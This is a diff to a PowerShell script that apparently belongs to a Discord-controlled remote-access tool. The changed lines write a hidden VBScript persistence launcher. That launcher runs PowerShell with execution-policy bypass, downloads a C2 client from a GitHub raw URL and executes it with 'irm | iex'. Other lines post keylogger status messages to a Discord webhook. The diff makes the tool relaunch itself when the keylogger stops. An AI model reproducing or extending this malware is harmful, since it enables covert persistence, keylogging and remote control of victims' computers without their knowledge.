@@ -66,7 +66,7 @@ Write-Output "Persistance Installed - Checking Version.."
         $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$hookurl='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$GHurl='$GHurl'; `$hookurl='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
 "@
         $tobat | Out-File -FilePath $VBpath -Force
         sleep 1
@@ -675,7 +675,15 @@ While ($true){
         $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
         Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
         $previouscmd = $response
-        break
+        $tobat = @"
+Set WshShell = WScript.CreateObject(`"WScript.Shell`")
+WScript.Sleep 200
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$GHurl='$GHurl'; `$hookurl='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+"@
+        $tobat | Out-File -FilePath $VBpath -Force
+        sleep 1
+        & $VBpath
+        exit
         }
     }
     finally{
@@ -740,4 +748,3 @@ while($true){
     }
 sleep 5
 }
-
